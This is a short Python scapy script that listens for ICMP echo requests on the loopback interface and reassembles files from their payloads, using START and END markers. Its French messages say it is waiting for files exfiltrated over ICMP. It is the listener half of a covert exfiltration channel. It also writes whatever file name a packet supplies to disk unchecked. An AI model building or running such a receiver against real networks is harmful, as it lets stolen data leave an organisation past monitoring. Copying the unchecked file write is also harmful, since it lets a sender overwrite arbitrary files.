from scapy.all import sniff, ICMP
import os

current_file = None
file_data = b''

def packet_callback(packet):
    global current_file, file_data
    print(f"pkt received")
    
    if ICMP in packet and packet[ICMP].type == 8:  # Echo Request
        payload = bytes(packet[ICMP].payload)
        print(f"payload is {payload}")
        
        if payload.startswith(b'START:'):
            current_file = payload[6:].decode().strip()
            file_data = b''
            print(f"Réception du fichier '{current_file}' commencée...")
        elif payload.startswith(b'END'):
            if current_file:
                with open(current_file, 'wb') as f:
                    f.write(file_data)
                print(f"Fichier '{current_file}' reçu avec succès.")
                print(f"Chemin: {os.path.abspath(current_file)}")
                current_file = None
        elif current_file:
            file_data += payload

print("En attente de fichiers exfiltrés via ICMP...")
sniff(filter="icmp", prn=packet_callback, store=0, iface="lo")

